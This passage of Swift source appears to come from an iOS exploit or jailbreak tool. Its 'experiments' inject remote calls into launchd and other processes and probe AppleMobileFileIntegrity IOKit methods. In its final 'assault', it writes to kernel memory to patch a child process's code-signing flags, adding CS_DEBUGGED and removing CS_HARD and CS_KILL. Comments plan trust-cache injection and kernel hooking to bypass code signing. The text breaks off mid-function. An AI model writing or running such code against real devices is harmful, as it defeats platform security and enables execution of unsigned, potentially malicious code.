        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        RootExecutor.rcall(sb, "free", nameAddr)
        
        detail += "\nFound \(foundMethods.count) active KeyStore methods: \(foundMethods)\n"
        detail += "KeyStore methods can potentially:\n"
        detail += "- Extract signing keys\n"
        detail += "- Create new key bags\n"
        detail += "- Manipulate trust anchors\n"
        
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ KeyStore probe", success: !foundMethods.isEmpty, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 58: AMFI Struct Method Deep Probe
    
    /// Experiment 58: AMFI methods need struct input â€” probe with various struct formats
    /// Known AMFI IOKit methods typically accept:
    /// - CDHash (20 bytes SHA1 or 32 bytes SHA256) for binary whitelisting
    /// - PID (4 bytes) for process-specific operations
    /// - Entitlement queries (string + PID)
    /// - Trust cache entries (CDHash + flags)
    ///
    /// We try different struct sizes and content to find what each selector expects
    private func expAMFIStructProbe() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AMFI Struct Method Deep Probe\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let ioConnectCallStruct = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallStructMethod"))
        
        guard ioConnectCallStruct != 0 else {
            detail += "IOConnectCallStructMethod not available\n"
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: detail, timestamp: Date())
        }
        
        // Re-open AMFI user client
        let nameAddr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        guard svc != 0 else {
            detail += "AMFI service not found\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        
        guard openRet == 0 && connect != 0 else {
            detail += "Failed to open AMFI: ret=0x\(String(format: "%x", openRet))\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "âœ… AMFI opened: connect=\(connect)\n\n"
        
        // IOConnectCallStructMethod(connect, selector, inputStruct, inputSize, outputStruct, &outputSize)
        // 6 params â€” safe for ARM64
        
        let structInAddr = mem + 0x2200   // input struct buffer (256 bytes)
        let structOutAddr = mem + 0x2400  // output struct buffer (256 bytes)
        let structOutSizeAddr = mem + 0x2600
        
        // Active selectors from exp 56: [2, 4, 5, 6, 7, 9, 11, 12, 13, 14, 15]
        // Test selector 2 first (likely the most basic method)
        
        var foundWorking: [(Int, String)] = []
        
        // Strategy 1: Try each active selector with different struct sizes
        // AMFI methods typically expect specific struct sizes
        let testSelectors = [2, 4, 5, 9, 11, 12]  // subset to avoid panic
        let testSizes: [UInt64] = [4, 8, 20, 24, 32, 40, 48, 64]
        
        detail += "--- Testing struct input sizes ---\n"
        
        for selector in testSelectors.prefix(4) {  // limit to 4 selectors
            detail += "\nSelector \(selector):\n"
            
            for size in testSizes {
                // Zero-fill input struct
                for i in 0..<Int(size / 8 + 1) {
                    sb[structInAddr + UInt64(i * 8)].setValue64(0)
                }
                
                // Set output size
                sb[structOutSizeAddr].setValue64(256)
                
                // Clear output
                for i in 0..<32 {
                    sb[structOutAddr + UInt64(i * 8)].setValue64(0)
                }
                
                // IOConnectCallStructMethod(connect, selector, input, inputSize, output, &outputSize)
                let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                             UInt64(connect),
                                             UInt64(selector),
                                             structInAddr, size,
                                             structOutAddr, structOutSizeAddr)
                
                let outSize = sb[structOutSizeAddr].value64()
                
                if ret == 0 {
                    detail += "  âœ… size=\(size): SUCCESS! outSize=\(outSize)\n"
                    foundWorking.append((selector, "struct_size=\(size)"))
                    
                    // Read output
                    if outSize > 0 && outSize <= 64 {
                        var outBuf = [UInt8](repeating: 0, count: Int(outSize))
                        sb.remoteRead(structOutAddr, to: &outBuf, size: outSize)
                        let hex = outBuf.prefix(24).map { String(format: "%02x", $0) }.joined(separator: " ")
                        detail += "    output: \(hex)\n"
                    }
                    break  // found working size for this selector
                } else if ret != 0xe00002c2 && ret != 0xe00002c7 && ret != 0xe00002bc {
                    // Different error â€” interesting!
                    detail += "  âš ï¸ size=\(size): ret=0x\(String(format: "%x", ret))\n"
                }
            }
        }
        
        // Strategy 2: Try selector 2 with PID as input (4 bytes)
        // AMFI might have a "check process" method
        detail += "\n--- Selector 2 with PID input ---\n"
        sb[structInAddr].setValue32(1)  // PID 1 = launchd
        sb[structOutSizeAddr].setValue64(256)
        let pidRet = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), 2,
                                         structInAddr, 4,
                                         structOutAddr, structOutSizeAddr)
        let pidOutSize = sb[structOutSizeAddr].value64()
        detail += "  PID=1: ret=0x\(String(format: "%x", pidRet)), outSize=\(pidOutSize)\n"
        if pidRet == 0 && pidOutSize > 0 {
            var outBuf = [UInt8](repeating: 0, count: min(Int(pidOutSize), 32))
            sb.remoteRead(structOutAddr, to: &outBuf, size: UInt64(outBuf.count))
            detail += "  output: \(outBuf.map { String(format: "%02x", $0) }.joined(separator: " "))\n"
            foundWorking.append((2, "PID input"))
        }
        
        // Strategy 3: Try selector 5 with CDHash-like input (20 bytes = SHA1)
        // This might be "add to trust cache" or "check CDHash"
        detail += "\n--- Selector 5 with CDHash input (20B zeros) ---\n"
        for i in 0..<3 { sb[structInAddr + UInt64(i * 8)].setValue64(0) }
        sb[structOutSizeAddr].setValue64(256)
        let cdRet = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                        UInt64(connect), 5,
                                        structInAddr, 20,
                                        structOutAddr, structOutSizeAddr)
        let cdOutSize = sb[structOutSizeAddr].value64()
        detail += "  ret=0x\(String(format: "%x", cdRet)), outSize=\(cdOutSize)\n"
        if cdRet == 0 {
            detail += "  âœ… CDHash-sized input ACCEPTED!\n"
            foundWorking.append((5, "CDHash input"))
        }
        
        // Strategy 4: Try with scalar+struct combo via IOConnectCallMethod workaround
        // Some methods need BOTH scalar and struct input
        // Use IOConnectCallScalarMethod with scalar[0] = selector-specific value
        detail += "\n--- Selector 9 with 2 scalar inputs ---\n"
        let scalarInAddr = mem + 0x2800
        sb[scalarInAddr].setValue64(1)       // arg0 = PID?
        sb[scalarInAddr + 8].setValue64(0)   // arg1 = flags?
        let scalarOutAddr = mem + 0x2A00
        let scalarOutCntAddr = mem + 0x2C00
        sb[scalarOutCntAddr].setValue32(16)
        let s9ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                        UInt64(connect), 9,
                                        scalarInAddr, 2,
                                        scalarOutAddr, scalarOutCntAddr)
        let s9out = sb[scalarOutCntAddr].value32()
        detail += "  2 scalars [1,0]: ret=0x\(String(format: "%x", s9ret)), outCnt=\(s9out)\n"
        if s9ret == 0 {
            let val = sb[scalarOutAddr].value64()
            detail += "  âœ… output[0] = 0x\(String(format: "%llx", val))\n"
            foundWorking.append((9, "2 scalar inputs"))
        }
        
        // Strategy 5: Try selector 2 with 2 scalars (PID + operation)
        detail += "\n--- Selector 2 with 2 scalar inputs ---\n"
        sb[scalarInAddr].setValue64(1)       // PID 1
        sb[scalarInAddr + 8].setValue64(0)   // operation 0
        sb[scalarOutCntAddr].setValue32(16)
        let s2ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                        UInt64(connect), 2,
                                        scalarInAddr, 2,
                                        scalarOutAddr, scalarOutCntAddr)
        let s2out = sb[scalarOutCntAddr].value32()
        detail += "  [PID=1, op=0]: ret=0x\(String(format: "%x", s2ret)), outCnt=\(s2out)\n"
        if s2ret == 0 {
            let val = sb[scalarOutAddr].value64()
            detail += "  âœ… output[0] = 0x\(String(format: "%llx", val))\n"
            foundWorking.append((2, "2 scalar [PID,op]"))
        }
        
        // Strategy 6: Try selector 4 with 3 scalars
        detail += "\n--- Selector 4 with 3 scalar inputs ---\n"
        sb[scalarInAddr].setValue64(1)       // PID
        sb[scalarInAddr + 8].setValue64(0)   // flags
        sb[scalarInAddr + 16].setValue64(0)  // extra
        sb[scalarOutCntAddr].setValue32(16)
        let s4ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                        UInt64(connect), 4,
                                        scalarInAddr, 3,
                                        scalarOutAddr, scalarOutCntAddr)
        let s4out = sb[scalarOutCntAddr].value32()
        detail += "  [1,0,0]: ret=0x\(String(format: "%x", s4ret)), outCnt=\(s4out)\n"
        if s4ret == 0 {
            let val = sb[scalarOutAddr].value64()
            detail += "  âœ… output[0] = 0x\(String(format: "%llx", val))\n"
            foundWorking.append((4, "3 scalar inputs"))
        }
        
        // Close AMFI
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        RootExecutor.rcall(sb, "free", nameAddr)
        
        detail += "\n--- RESULTS ---\n"
        detail += "Working combinations: \(foundWorking.count)\n"
        for (sel, desc) in foundWorking {
            detail += "  Selector \(sel): \(desc)\n"
        }
        if foundWorking.isEmpty {
            detail += "No working combination found yet.\n"
            detail += "Methods might need specific entitlement or token.\n"
            detail += "NEXT: try with 4,5,6 scalar inputs or larger structs\n"
        } else {
            detail += "\nðŸ”¥ FOUND WORKING AMFI METHODS!\n"
            detail += "Next: determine what each method DOES\n"
            detail += "Try: pass our binary's CDHash to whitelist it\n"
        }
        
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI struct", success: !foundWorking.isEmpty, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 59: AMFI from Launchd + amfid Hunt
    
    /// Experiment 59: Try AMFI IOKit from LAUNCHD context (PID 1 = most trusted)
    /// Also: find amfid daemon and try to get its task port
    /// amfid is the userspace daemon that handles AMFI policy decisions
    /// If we can control amfid â†’ we control code signing decisions!
    private func expAMFIFromLaunchd(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "AMFI from Launchd + amfid Hunt\n\n"
        let mgr = dspmgr.shared
        
        // Part 1: Try opening AMFI user client from LAUNCHD (PID 1)
        // Launchd is the most privileged userspace process
        detail += "=== Part 1: AMFI IOKit from launchd ===\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let ioServiceMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceMatching"))
        let _ = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceGetMatchingService"))
        let _ = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceOpen"))
        let _ = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOConnectCallScalarMethod"))
        
        var amfiConnect: UInt32 = 0
        
        if ioServiceMatching != 0 {
            let nameAddr = remote_alloc_str(rc, "AppleMobileFileIntegrity")
            let matchDict = RootExecutor.rcall(rc, "IOServiceMatching", nameAddr)
            
            if matchDict != 0 {
                let svc = RootExecutor.rcall(rc, "IOServiceGetMatchingService", 0, matchDict)
                detail += "AMFI service from launchd: 0x\(String(format: "%x", svc))\n"
                
                if svc != 0 {
                    let taskSelf = RootExecutor.rcall(rc, "mach_task_self")
                    let connectAddr = mem + 0x1A00
                    rc[connectAddr].setValue32(0)
                    let openRet = RootExecutor.rcall(rc, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
                    amfiConnect = rc[connectAddr].value32()
                    detail += "IOServiceOpen: ret=0x\(String(format: "%x", openRet)), connect=\(amfiConnect)\n"
                    
                    if openRet == 0 && amfiConnect != 0 {
                        detail += "âœ… AMFI opened from launchd!\n\n"
                        
                        // Try selectors with different scalar counts from launchd
                        let scalarInAddr = mem + 0x2000
                        let scalarOutAddr = mem + 0x2200
                        let scalarOutCntAddr = mem + 0x2400
                        
                        // Selector 2 with 1 scalar (our PID)
                        let ourPid = RootExecutor.rcall(rc, "getpid")
                        rc[scalarInAddr].setValue64(ourPid)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r2 = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                    UInt64(amfiConnect), 2,
                                                    scalarInAddr, 1,
                                                    scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 2 [PID=\(ourPid)]: ret=0x\(String(format: "%x", r2))\n"
                        
                        // Selector 2 with 4 scalars
                        rc[scalarInAddr].setValue64(ourPid)
                        rc[scalarInAddr + 8].setValue64(0)
                        rc[scalarInAddr + 16].setValue64(0)
                        rc[scalarInAddr + 24].setValue64(0)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r2b = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                     UInt64(amfiConnect), 2,
                                                     scalarInAddr, 4,
                                                     scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 2 [4 scalars]: ret=0x\(String(format: "%x", r2b))\n"
                        
                        // Selector 5 with 1 scalar
                        rc[scalarInAddr].setValue64(0)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r5 = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                    UInt64(amfiConnect), 5,
                                                    scalarInAddr, 1,
                                                    scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 5 [0]: ret=0x\(String(format: "%x", r5))\n"
                        
                        // Selector 9 with 1 scalar = 0 (might be "disable" or "query")
                        rc[scalarInAddr].setValue64(0)
                        rc[scalarOutCntAddr].setValue32(16)
                        let r9 = RootExecutor.rcall(rc, "IOConnectCallScalarMethod",
                                                    UInt64(amfiConnect), 9,
                                                    scalarInAddr, 1,
                                                    scalarOutAddr, scalarOutCntAddr)
                        detail += "Sel 9 [0]: ret=0x\(String(format: "%x", r9))\n"
                        
                        // Check if any succeeded
                        if r2 == 0 || r2b == 0 || r5 == 0 || r9 == 0 {
                            detail += "\nðŸ”¥ðŸ”¥ðŸ”¥ LAUNCHD HAS AMFI ACCESS!\n"
                            let outVal = rc[scalarOutAddr].value64()
                            detail += "output[0] = 0x\(String(format: "%llx", outVal))\n"
                        } else {
                            detail += "\nLaunchd also rejected â€” needs specific entitlement\n"
                        }
                        
                        // Close
                        RootExecutor.rcall(rc, "IOServiceClose", UInt64(amfiConnect))
                    } else {
                        detail += "âŒ Cannot open AMFI from launchd\n"
                    }
                }
            }
            RootExecutor.rcall(rc, "free", remote_alloc_str(rc, "AppleMobileFileIntegrity"))
        } else {
            detail += "IOKit not loaded in launchd\n"
        }
        
        // Part 2: Find amfid daemon
        detail += "\n=== Part 2: Hunt for amfid ===\n"
        
        // amfid is the AMFI daemon â€” it makes code signing decisions
        // If we can find it and RC into it, we have full AMFI control
        let amfidProc = mgr.findProc(name: "amfid")
        detail += "amfid proc in kernel: 0x\(String(format: "%llx", amfidProc))\n"
        
        if amfidProc != 0 {
            // Read amfid's PID
            let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
            detail += "amfid PID: \(amfidPid)\n"
            
            // Read amfid's proc_ro â†’ task
            let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
            let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
            detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
            detail += "amfid task: 0x\(String(format: "%llx", amfidTask))\n"
            
            // Read amfid's cs_flags
            let amfidCSFlags = mgr.readCSFlags(pid: Int32(bitPattern: amfidPid))
            detail += "amfid cs_flags: 0x\(String(format: "%x", amfidCSFlags))\n"
            if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY âœ…\n" }
            if amfidCSFlags & 0x4000 != 0 { detail += "  CS_GET_TASK_ALLOW\n" }
            
            detail += "\nâœ… amfid FOUND! PID=\(amfidPid)\n"
            detail += "amfid is the code signing policy daemon.\n"
            detail += "If we can RC into amfid â†’ full AMFI control!\n"
            detail += "NEXT: try RemoteCall init to amfid process\n"
        } else {
            detail += "amfid not found in process list\n"
            detail += "Trying to find via name scan...\n"
            
            // Scan process list for amfi-related processes
            let procs = ["amfid", "trustd", "securityd", "syspolicyd"]
            for name in procs {
                let proc = mgr.findProc(name: name)
                if proc != 0 {
                    let pid = ds_kread32(proc + UInt64(off_proc_p_pid))
                    detail += "  \(name): PID=\(pid), proc=0x\(String(format: "%llx", proc))\n"
                }
            }
        }
        
        // Part 3: Trust Cache research
        detail += "\n=== Part 3: Trust Cache Info ===\n"
        detail += "Trust caches are kernel-resident lists of allowed CDHashes.\n"
        detail += "If we can ADD our binary's CDHash to a trust cache â†’ bypass AMFI!\n"
        detail += "Trust cache structs are in kernel heap (kalloc zone).\n"
        detail += "Our socket KRW might not reach them, but worth investigating.\n"
        
        // Try to find trust cache pointer via sysctl
        let tcNameAddr = remote_alloc_str(rc, "security.mac.amfi.trust_cache_count")
        let tcBufAddr = mem + 0x2800
        let tcSizeAddr = mem + 0x2A00
        rc[tcSizeAddr].setValue64(8)
        let tcRet = RootExecutor.rcall(rc, "sysctlbyname", tcNameAddr, tcBufAddr, tcSizeAddr, 0, 0)
        if tcRet == 0 {
            let tcCount = rc[tcBufAddr].value64()
            detail += "Trust cache count: \(tcCount)\n"
        } else {
            detail += "trust_cache_count sysctl: ret=\(tcRet) (not available)\n"
        }
        RootExecutor.rcall(rc, "free", tcNameAddr)
        
        // Try amfi.developer_mode_status
        let devNameAddr = remote_alloc_str(rc, "security.mac.amfi.developer_mode_status")
        rc[tcSizeAddr].setValue64(4)
        let devRet = RootExecutor.rcall(rc, "sysctlbyname", devNameAddr, tcBufAddr, tcSizeAddr, 0, 0)
        if devRet == 0 {
            let devMode = rc[tcBufAddr].value32()
            detail += "Developer mode: \(devMode)\n"
        } else {
            detail += "developer_mode_status: ret=\(devRet)\n"
        }
        RootExecutor.rcall(rc, "free", devNameAddr)
        
        let success = amfidProc != 0 || (amfiConnect != 0)
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ AMFI launchd+amfid", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 60: RemoteCall into amfid
    
    /// Experiment 60: Initialize RemoteCall into amfid daemon!
    /// amfid (PID 52) is the code signing policy daemon.
    /// It has the entitlements needed to call AMFI IOKit methods.
    /// If we can RC into amfid â†’ call AMFI methods FROM amfid â†’ bypass!
    ///
    /// Strategy:
    /// 1. Find amfid PID (already found: 52)
    /// 2. Use dspmgr.rcinit(process: "amfid") to establish RemoteCall
    /// 3. From amfid context: call IOConnectCallScalarMethod on AMFI
    /// 4. amfid has com.apple.private.amfi.can-execute entitlement!
    private func expRCIntoAmfid(rc: RemoteCall) -> ExperimentResult {
        let mgr = dspmgr.shared
        var detail = "ðŸ”¥ amfid Kernel Research\n\n"
        
        // RC to amfid HANGS (confirmed â€” single-threaded daemon)
        // Direct task struct reads PANIC (itk_space, threads in wrong zone)
        // Only safe reads: proc, proc_ro, pid, cs_flags
        
        // Step 1: Find amfid
        let amfidProc = mgr.findProc(name: "amfid")
        guard amfidProc != 0 else {
            detail += "âŒ amfid not found in process list\n"
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ amfid research", success: false, detail: detail, timestamp: Date())
        }
        
        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
        detail += "amfid PID: \(amfidPid)\n"
        detail += "amfid proc: 0x\(String(format: "%llx", amfidProc))\n"
        
        // Step 2: Read proc_ro (SAFE â€” same zone as proc)
        let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
        detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
        
        // Step 3: Read cs_flags (SAFE â€” in proc_ro)
        let amfidCSFlags = mgr.readCSFlags(pid: Int32(bitPattern: amfidPid))
        detail += "amfid cs_flags: 0x\(String(format: "%x", amfidCSFlags))\n"
        if amfidCSFlags & 0x001 != 0 { detail += "  CS_VALID\n" }
        if amfidCSFlags & 0x004 != 0 { detail += "  CS_HARD\n" }
        if amfidCSFlags & 0x008 != 0 { detail += "  CS_KILL\n" }
        if amfidCSFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY âœ…\n" }
        
        // Step 4: Read p_flag (SAFE)
        let amfidPFlag = ds_kread32(amfidProc + UInt64(off_proc_p_flag))
        detail += "amfid p_flag: 0x\(String(format: "%x", amfidPFlag))\n"
        
        // Step 5: Read task pointer (SAFE to read pointer, NOT safe to dereference task internals)
        let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
        detail += "amfid task ptr: 0x\(String(format: "%llx", amfidTask))\n"
        detail += "âš ï¸ Cannot read task internals (itk_space, threads â†’ panic)\n"
        
        // Step 6: Read ucred (SAFE â€” pointer in proc_ro)
        var ucredAddr: UInt64 = 0
        if amfidProcRo != 0 {
            ucredAddr = ds_kread64(amfidProcRo + UInt64(off_proc_ro_p_ucred))
            detail += "amfid ucred: 0x\(String(format: "%llx", ucredAddr))\n"
            
            // Read uid from ucred (offset 0x18 is cr_uid typically)
            if ucredAddr != 0 {
                let uid = ds_kread32(ucredAddr + 0x18)
                detail += "amfid uid: \(uid)\n"
            }
        }
        
        // Step 7: Read p_textvp (vnode of amfid binary)
        let textVP = ds_kread64(amfidProc + UInt64(off_proc_p_textvp))
        detail += "amfid textvp: 0x\(String(format: "%llx", textVP))\n"
        
        // Step 8: Read process name
        var nameBuf = [UInt8](repeating: 0, count: 32)
        let nameAddr = amfidProc + UInt64(off_proc_p_name)
        for i in 0..<32 {
            nameBuf[i] = ds_kread8(nameAddr + UInt64(i))
            if nameBuf[i] == 0 { break }
        }
        let procName = String(bytes: nameBuf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? "?"
        detail += "amfid name: \(procName)\n"
        
        // Step 9: Also find trustd and securityd
        detail += "\n=== Related daemons ===\n"
        let relatedProcs = ["trustd", "securityd", "syspolicyd"]
        for name in relatedProcs {
            let proc = mgr.findProc(name: name)
            if proc != 0 {
                let pid = ds_kread32(proc + UInt64(off_proc_p_pid))
                let csf = mgr.readCSFlags(pid: Int32(bitPattern: pid))
                detail += "\(name): PID=\(pid), cs=0x\(String(format: "%x", csf))"
                if csf & 0x100 != 0 { detail += " [PLATFORM]" }
                detail += "\n"
            }
        }
        
        detail += "\n=== CONCLUSION ===\n"
        detail += "RC to amfid: âŒ IMPOSSIBLE (hangs â€” single-threaded)\n"
        detail += "Task internals: âŒ INACCESSIBLE (wrong kernel zone)\n"
        detail += "amfid is CS_PLATFORM_BINARY with uid=0\n\n"
        detail += "Remaining AMFI bypass paths:\n"
        detail += "â€¢ Trust cache injection (find TC struct in kernel heap)\n"
        detail += "â€¢ IOSurface external method exploitation\n"
        detail += "â€¢ Kernel function hooking (if we find writable code)\n"
        detail += "â€¢ Developer mode exploitation (already enabled!)\n"
        
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ amfid research", success: true, detail: detail, timestamp: Date())
    }
    
    // MARK: - ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 61: ALL REMAINING PATHS
    
    /// Experiment 61: Combined final assault â€” all remaining bypass paths in one
    /// 1. Trust Cache scan (find TC linked list via known kernel symbols)
    /// 2. Developer mode spawn (special flags for dev-mode enabled devices)
    /// 3. posix_spawn with responsibility_spawnattrs (launchd managed spawn)
    /// 4. IOSurface external method 9/10 (getValue/setValue on kernel objects)
    /// 5. Spawn with CS_DEBUGGED patched on child process
    private func expFinalAssault(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let mgr = dspmgr.shared
        var detail = "ðŸ”¥ FINAL ASSAULT â€” All remaining paths\n\n"
        var anySuccess = false
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 1: Developer Mode Spawn
        // Developer mode = 1 (confirmed). On iOS 16+, dev mode
        // allows some unsigned code execution for development.
        // Try: posix_spawnattr with _POSIX_SPAWN_DISABLE_ASLR + persona
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "â•â•â• PATH 1: Developer Mode Spawn â•â•â•\n"
        
        // Copy binary first
        let srcPath = remote_alloc_str(rc, "/bin/df")
        let dstPath = remote_alloc_str(rc, "/tmp/.dsp_devmode_test")
        RootExecutor.rcall(rc, "unlink", dstPath)
        let sf = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
        let df = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if sf != UInt64(bitPattern: -1) && df != UInt64(bitPattern: -1) {
            let buf = mem + 0x800
            for _ in 0..<50 {
                let n = RootExecutor.rcall(rc, "read", sf, buf, 2048)
                if n == 0 || n > 2048 { break }
                RootExecutor.rcall(rc, "write", df, buf, n)
            }
            RootExecutor.rcall(rc, "close", sf)
            RootExecutor.rcall(rc, "close", df)
        }
        
        // Try spawn with various "developer" flags
        let devFlags: [(String, UInt64)] = [
            ("DISABLE_ASLR (0x100)", 0x0100),
            ("SETEXEC (0x40)", 0x0040),
            ("SETPGROUP|SETSID|DISABLE_ASLR", 0x0502),
            ("CLOEXEC_DEFAULT|DISABLE_ASLR", 0x1100),
        ]
        
        for (name, flags) in devFlags {
            let attrAddr = mem + 0x1800
            rc[attrAddr].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
            RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, flags)
            
            let argvBase = mem + 0x1C00
            rc[argvBase].setValue64(dstPath)
            rc[argvBase + 8].setValue64(0)
            let pidAddr = mem + 0x1E00
            rc[pidAddr].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, attrAddr, argvBase, 0)
            RootExecutor.rcall(rc, "usleep", 300000)
            RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
            
            detail += "  \(name): ret=\(ret)\n"
            if ret == 0 {
                detail += "  ðŸŽ‰ SPAWN SUCCESS!\n"
                anySuccess = true
            }
            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
        }
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 2: CS_DEBUGGED on child before exec
        // Fork child â†’ patch its cs_flags to add CS_DEBUGGED â†’ then spawn
        // CS_DEBUGGED tells AMFI "debugger attached, relax checks"
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• PATH 2: CS_DEBUGGED patch + spawn â•â•â•\n"
        
        // Fork to create child
        let childPid = RootExecutor.rcall(rc, "fork")
        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
            detail += "Forked child PID: \(childPid)\n"
            
            // Patch child's cs_flags to add CS_DEBUGGED (0x800) + CS_GET_TASK_ALLOW (0x4000)
            // Also remove CS_HARD (0x4) and CS_KILL (0x8)
            let childProc = mgr.findProc(pid: Int32(childPid))
            if childProc != 0 {
                let childProcRo = ds_kread64(childProc + UInt64(off_proc_p_proc_ro))
                if childProcRo != 0 {
                    let currentFlags = ds_kread32(childProcRo + 0x1c)
                    // Add CS_DEBUGGED | CS_GET_TASK_ALLOW, remove CS_HARD | CS_KILL
                    let newFlags = (currentFlags | 0x4800) & ~UInt32(0x000C)
                    ds_kwrite32(childProcRo + 0x1c, newFlags)
                    let afterFlags = ds_kread32(childProcRo + 0x1c)
                    detail += "cs_flags: 0x\(String(format: "%x", currentFlags)) â†’ 0x\(String(format: "%x", afterFlags))\n"
                    
                    if afterFlags != currentFlags {
                        detail += "âœ… CS_DEBUGGED patched on child!\n"
                    }
                }
            }
            
            // Kill child (it's just a fork copy, not useful yet)
            RootExecutor.rcall(rc, "kill", childPid, 9)
            RootExecutor.rcall(rc, "waitpid", childPid, mem + 0x380, 0)
            
            // Now: spawn the copied binary â€” AMFI checks the NEW process
            // Patch cs_flags AFTER spawn (race condition approach)
            detail += "\nSpawn + immediate cs_flags patch (race)...\n"
            let argvBase2 = mem + 0x1C00
            rc[argvBase2].setValue64(dstPath)
            rc[argvBase2 + 8].setValue64(0)
